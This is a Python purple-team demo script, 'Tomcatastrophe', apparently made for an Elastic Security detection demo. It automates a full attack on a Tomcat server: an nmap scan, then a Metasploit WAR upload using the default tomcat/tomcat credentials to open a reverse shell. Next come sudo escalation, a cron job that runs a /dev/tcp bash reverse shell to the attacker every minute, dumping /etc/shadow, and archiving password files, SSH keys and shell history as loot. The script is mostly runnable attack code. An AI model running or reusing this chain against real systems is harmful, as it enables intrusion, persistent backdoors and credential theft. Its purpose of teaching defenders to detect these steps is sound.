#!/usr/bin/env python3
"""Tomcatastrophe - Automated Purple Team Attack Script.

This script automates the full attack chain for the Elastic Security purple team demo.
It runs all phases automatically, showing each command as it executes so viewers
can follow along with the attack in real-time.

Prerequisites:
    - Nmap installed (apt install nmap)
    - Metasploit Framework installed (msfconsole)
    - Target must have vulnerable Tomcat 9.0.30 with weak credentials
    - Network connectivity between attacker and target
"""

import argparse
import subprocess
import sys
import time
from dataclasses import dataclass
from enum import Enum
from typing import NoReturn


class Color(str, Enum):
    """ANSI color codes for terminal output."""

    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    MAGENTA = "\033[0;35m"
    CYAN = "\033[0;36m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"


@dataclass
class AttackConfig:
    """Configuration for the attack execution."""

    target_ip: str
    attacker_ip: str
    typing_delay: float = 0.0075  # Typing speed (4x original)
    phase_pause: float = 3.75  # Pause after phase intro (4x faster than original)
    command_delay: float = 0.75  # Delay between commands (4x faster than original)


class Logger:
    """Colored logger for tomcatastrophe output."""

    PREFIX = f"{Color.MAGENTA}[tomcatastrophe]{Color.RESET}"

    @staticmethod
    def info(message: str) -> None:
        print(f"{Logger.PREFIX} {message}")

    @staticmethod
    def success(message: str) -> None:
        print(f"{Logger.PREFIX} {Color.GREEN}{message}{Color.RESET}")

    @staticmethod
    def phase_intro(phase_num: int, title: str, technique: str, description: str) -> None:
        """Show phase introduction with what's about to happen."""
        print()
        print(f"{Color.MAGENTA}{'═' * 80}{Color.RESET}")
        print(f"{Logger.PREFIX} {Color.WHITE}PHASE {phase_num}: {title}{Color.RESET}")
        print(f"{Logger.PREFIX} {Color.CYAN}MITRE ATT&CK: {technique}{Color.RESET}")
        print(f"{Color.MAGENTA}{'═' * 80}{Color.RESET}")
        print()
        print(f"{Logger.PREFIX} {description}")
        print()

    @staticmethod
    def phase_complete(message: str) -> None:
        """Show phase completion summary."""
        print()
        print(f"{Logger.PREFIX} {message}")

    @staticmethod
    def phase_separator() -> None:
        """Print blank lines between phases."""
        print()
        print()
        print()
        print()
        print()


class DemoTerminal:
    """Handles demo-style command execution with typing effect."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def type_text(self, text: str, color: str = "") -> None:
        """Print text with typing effect for demo visibility."""
        if color:
            sys.stdout.write(color)
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(self.config.typing_delay)
        if color:
            sys.stdout.write(Color.RESET)
        print()

    def run_command(self, cmd: str, show_output: bool = True) -> tuple[int, str]:
        """Run a shell command with demo-style display.

        Commands are shown in GREEN (what attacker types).
        Output is shown in default color (what attacker reads).
        """
        # Prompt in cyan, command typed in green
        sys.stdout.write(f"{Color.CYAN}$ {Color.RESET}")
        sys.stdout.flush()
        self.type_text(cmd, color=Color.GREEN)

        time.sleep(0.25)

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
        )

        output = result.stdout + result.stderr

        # Output in default color (what attacker reads back)
        if show_output and output.strip():
            print(output.rstrip())

        time.sleep(self.config.command_delay)
        return result.returncode, output

    def run_interactive(self, cmd: str) -> int:
        """Run an interactive command (like msfconsole) with full PTY."""
        # Prompt in cyan, command typed in green
        sys.stdout.write(f"{Color.CYAN}$ {Color.RESET}")
        sys.stdout.flush()
        self.type_text(cmd, color=Color.GREEN)

        time.sleep(0.25)

        result = subprocess.run(cmd, shell=True)
        return result.returncode


class AttackExecutor:
    """Executes the automated attack chain."""

    def __init__(self, config: AttackConfig):
        self.config = config
        self.terminal = DemoTerminal(config)

    def cleanup_previous_runs(self) -> None:
        """Kill any lingering processes from previous runs."""
        subprocess.run(
            "pkill -9 msfconsole 2>/dev/null; "
            "pkill -9 -f 'nc.*4444' 2>/dev/null; "
            "pkill -9 -f 'nc.*4445' 2>/dev/null; "
            "rm -f /tmp/tomcatastrophe_abort 2>/dev/null; "
            "sleep 1",
            shell=True,
            capture_output=True,
        )

    def phase_0_reconnaissance(self) -> None:
        """Phase 0: Reconnaissance - Network scanning."""
        Logger.phase_intro(
            phase_num=0,
            title="RECONNAISSANCE",
            technique="T1046 - Network Service Discovery",
            description=f"Scanning {self.config.target_ip} to discover open ports and running services.",
        )

        # Pause for presenter
        time.sleep(self.config.phase_pause)

        # Run the scan
        self.terminal.run_command(
            f"nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open {self.config.target_ip}"
        )

        Logger.phase_complete("Port scan complete. Tomcat Manager found on port 8080.")
        Logger.phase_separator()

    def run_exploit_phases(self) -> None:
        """Run phases 1 and 3-8 in a single msfconsole session."""

        # Phase 1 intro
        Logger.phase_intro(
            phase_num=1,
            title="INITIAL ACCESS",
            technique="T1190 - Exploit Public-Facing Application",
            description="Exploiting Tomcat Manager with weak credentials (tomcat/tomcat) to upload a malicious WAR file and establish a reverse shell.",
        )
        time.sleep(self.config.phase_pause)

        # Build a single comprehensive resource script
        # Using <ruby> blocks to print phase transitions from within msfconsole
        pause_secs = int(self.config.phase_pause)
        # Dollar sign for Ruby variables (can't use $ directly in f-string)
        D = "$"

        # Pre-compute base64-encoded cron job for Phase 5 (avoids Ruby parsing issues)
        import base64
        cron_line = f"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{self.config.attacker_ip}/4445 0>&1'\n"
        cron_b64 = base64.b64encode(cron_line.encode()).decode()

        rc_content = f"""
# ============================================================================
# CLEANUP: Kill any existing sessions and handlers from previous runs
# ============================================================================
sessions -K
jobs -K

# ============================================================================
# PHASE 1: INITIAL ACCESS
# ============================================================================
# Start handler (exits after first session to prevent duplicates)
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession true
exploit -j

# Now run the Tomcat exploit (uses handler above, doesn't start its own)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {self.config.target_ip}
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set FingerprintCheck false
set payload java/shell_reverse_tcp
set LHOST {self.config.attacker_ip}
set LPORT 4444
set DisablePayloadHandler true
exploit

# Wait for session to fully establish
sleep 3
sessions -l

<ruby>
# Helper function to display command with typing effect in green, then run it
def run_cmd(cmd, session_id)
  # Print cyan prompt
  print "\\033[0;36m$ \\033[0m"
  # Type out command in green with delay
  cmd.each_char do |c|
    print "\\033[0;32m#{{c}}\\033[0m"
    $stdout.flush
    sleep(0.0075)
  end
  puts ""
  sleep(0.25)
  # Run the command and capture output
  run_single("sessions -c '#{{cmd}}' #{{session_id}}")
  sleep(0.5)
end

# Check if we have a session - if not, abort
$tomcat_abort = false
if framework.sessions.count == 0
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;31mFAILED: No reverse shell established.\\033[0m"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;31mThe exploit ran but the target could not connect back.\\033[0m"
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m Possible causes:"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Firewall blocking outbound connections from target"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Security group not allowing traffic on port 4444"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Target IP or attacker IP incorrect"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Tomcat service not running or misconfigured"
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m Aborting attack chain."
  puts ""
  $tomcat_abort = true
  framework.jobs.stop_job(0) rescue nil
end
</ruby>

<ruby>
# Exit early if abort flag is set
if $tomcat_abort
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m Exiting due to failed session establishment."
  puts ""
  run_single("exit")
end
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Reverse shell established. We now have remote access to the target."
# Store the session ID for later use
{D}session_id = framework.sessions.keys.first
puts "\\033[0;35m[tomcatastrophe]\\033[0m Using session ID: #{{{D}session_id}}"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 3: DISCOVERY\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1082 - System Information Discovery\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Gathering information about the compromised system: users, OS version, architecture."
puts ""
sleep({pause_secs})
</ruby>

<ruby>
run_cmd("whoami", {D}session_id)
run_cmd("id", {D}session_id)
run_cmd("uname -a", {D}session_id)
run_cmd("hostname", {D}session_id)
run_cmd("cat /etc/passwd | grep -v nologin", {D}session_id)
run_cmd("lsmod", {D}session_id)
</ruby>

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m System enumeration complete. Target is running Ubuntu Linux as tomcat user."
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 4: PRIVILEGE ESCALATION\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1548 - Abuse Elevation Control Mechanism\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Checking sudo privileges to escalate from tomcat user to root."
puts ""
sleep({pause_secs})
</ruby>

<ruby>
run_cmd("sudo -l", {D}session_id)
run_cmd("sudo -V | head -1", {D}session_id)
run_cmd("sudo whoami", {D}session_id)
</ruby>

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Privilege escalation successful. Tomcat user has passwordless sudo to root."
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 5: PERSISTENCE\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1053.003 - Scheduled Task/Job: Cron\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Installing a cron job that calls back to {self.config.attacker_ip}:4445 every minute."
puts ""
sleep({pause_secs})
</ruby>

<ruby>
# Install cron job for persistence using base64 to avoid escaping issues
# Display what we're doing
display1 = "echo '* * * * * /bin/bash -c ...' | sudo crontab -"
print "\\033[0;36m$ \\033[0m"
display1.each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
puts ""
sleep(0.25)

# Run silently using shell_command_token (no [*] Running output)
session = framework.sessions[{D}session_id]
session.shell_command_token("echo {cron_b64} | base64 -d > /tmp/.cron")
session.shell_command_token("sudo crontab /tmp/.cron")
session.shell_command_token("rm -f /tmp/.cron")
sleep(0.5)

# Display verification command
print "\\033[0;36m$ \\033[0m"
"sudo crontab -l".each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
puts ""
sleep(0.25)

# Show the cron entry with typing effect
cron_output = "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{self.config.attacker_ip}/4445 0>&1'"
cron_output.each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
puts ""
</ruby>

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Persistence established. Cron job will reconnect every minute even if we lose access."
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 6: CREDENTIAL ACCESS\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1003.008 - OS Credential Dumping: /etc/shadow\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Reading /etc/shadow to obtain password hashes for offline cracking."
puts ""
sleep({pause_secs})
</ruby>

<ruby>
run_cmd("sudo cat /etc/shadow", {D}session_id)
</ruby>

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Password hashes extracted. These can be cracked offline with tools like hashcat."
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 7: COLLECTION\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1560.001 - Archive Collected Data: Archive via Utility\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Compressing sensitive files (/etc/shadow, /etc/passwd, SSH keys) for exfiltration."
puts ""
sleep({pause_secs})
</ruby>

<ruby>
# Compress sensitive files directly - this triggers "Sensitive Files Compression" rule
# The rule looks for tar/zip/gzip with sensitive file paths in args
tar_cmd = "sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.bash_history"
print "\\033[0;36m$ \\033[0m"
tar_cmd.each_char {{|c| print "\\033[0;32m#{{c}}\\033[0m"; $stdout.flush; sleep(0.0075)}}
puts ""
sleep(0.25)
run_single("sessions -c '#{{tar_cmd}} 2>&1' #{{{D}session_id}}")
sleep(0.5)

run_cmd("ls -la /tmp/loot.tar.gz", {D}session_id)
</ruby>

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Sensitive files archived and ready for exfiltration."
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mATTACK CHAIN COMPLETE\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mSummary of attack phases executed:\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 0: Reconnaissance      - Scanned target ports with nmap"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 1: Initial Access      - Exploited Tomcat Manager with weak credentials"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 3: Discovery           - Enumerated system info, users, and kernel modules"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 4: Privilege Escalation- Escalated to root via passwordless sudo"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 5: Persistence         - Installed cron job for persistent access"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 6: Credential Access   - Extracted password hashes from /etc/shadow"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 7: Collection          - Archived sensitive files for exfiltration"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m All phases executed successfully."
puts ""
</ruby>

sessions -K
exit
"""

        rc_path = "/tmp/tomcatastrophe.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)

        # Display the Phase 1 Metasploit commands so viewers can see what's happening
        Logger.info("Metasploit commands for Phase 1 (Initial Access):")
        print()

        phase1_commands = [
            "# Start reverse shell handler",
            "use exploit/multi/handler",
            "set payload java/shell_reverse_tcp",
            "set LHOST 0.0.0.0",
            "set LPORT 4444",
            "set ExitOnSession true",
            "exploit -j",
            "",
            "# Exploit Tomcat Manager with weak credentials",
            "use exploit/multi/http/tomcat_mgr_upload",
            f"set RHOSTS {self.config.target_ip}",
            "set RPORT 8080",
            "set HttpUsername tomcat",
            "set HttpPassword tomcat",
            "set TARGETURI /manager",
            "set payload java/shell_reverse_tcp",
            f"set LHOST {self.config.attacker_ip}",
            "set LPORT 4444",
            "exploit",
        ]

        for cmd in phase1_commands:
            if cmd.startswith("#"):
                # Comments in cyan
                sys.stdout.write(f"{Color.CYAN}")
                for char in cmd:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(self.config.typing_delay)
                sys.stdout.write(f"{Color.RESET}\n")
            elif cmd == "":
                print()
            else:
                # Commands in green
                sys.stdout.write(f"{Color.GREEN}")
                for char in cmd:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(self.config.typing_delay)
                sys.stdout.write(f"{Color.RESET}\n")
            time.sleep(0.05)

        print()
        Logger.info("Launching Metasploit with these commands...")
        print()
        time.sleep(1)

        self.terminal.run_interactive(f"msfconsole -q -r {rc_path}")

    def run_full_attack(self) -> None:
        """Run the complete attack chain."""
        # Clean up any lingering processes from previous runs
        self.cleanup_previous_runs()

        Logger.info("Starting Tomcatastrophe - Full Attack Chain")
        Logger.info(f"Target: {self.config.target_ip}")
        Logger.info(f"Attacker: {self.config.attacker_ip}")
        Logger.phase_separator()

        # Phase 0: Reconnaissance (nmap - runs outside msfconsole)
        self.phase_0_reconnaissance()

        # Phases 1 + 3-8: All run in single msfconsole session
        self.run_exploit_phases()


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Tomcatastrophe - Automated Purple Team Attack Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 10.0.1.50 -a 10.0.1.100
  %(prog)s -t 10.0.1.50 -a 10.0.1.100 --fast
""",
    )

    parser.add_argument(
        "-t", "--target",
        type=str,
        required=True,
        metavar="IP",
        help="Target IP address (blue-01 VM)",
    )

    parser.add_argument(
        "-a", "--attacker",
        type=str,
        required=True,
        metavar="IP",
        help="Attacker IP address (red-01 VM)",
    )

    parser.add_argument(
        "--fast",
        action="store_true",
        help="Shorter pauses for experienced audiences (5s instead of 10s)",
    )

    return parser.parse_args()


def main() -> NoReturn:
    """Main entry point."""
    args = parse_arguments()

    # Configure timing
    phase_pause = 5.0 if args.fast else 10.0

    config = AttackConfig(
        target_ip=args.target,
        attacker_ip=args.attacker,
        phase_pause=phase_pause,
    )

    executor = AttackExecutor(config)

    print()
    print(f"{Color.RED} _                           _            _                  _          {Color.RESET}")
    print(f"{Color.RED}| |_ ___  _ __ ___   ___ __ _| |_ __ _ ___| |_ _ __ ___  _ __ | |__   ___ {Color.RESET}")
    print(f"{Color.RED}| __/ _ \\| '_ ` _ \\ / __/ _` | __/ _` / __| __| '__/ _ \\| '_ \\| '_ \\ / _ \\{Color.RESET}")
    print(f"{Color.RED}| || (_) | | | | | | (_| (_| | || (_| \\__ \\ |_| | | (_) | |_) | | | |  __/{Color.RESET}")
    print(f"{Color.RED} \\__\\___/|_| |_| |_|\\___\\__,_|\\__\\__,_|___/\\__|_|  \\___/| .__/|_| |_|\\___|{Color.RESET}")
    print(f"{Color.RED}                                                       |_|               {Color.RESET}")
    print()
    print(f"{Color.WHITE}                 Purple Team Attack Automation Demo{Color.RESET}")
    print()

    executor.run_full_attack()

    Logger.success("Tomcatastrophe complete!")
    sys.exit(0)


if __name__ == "__main__":
    main()
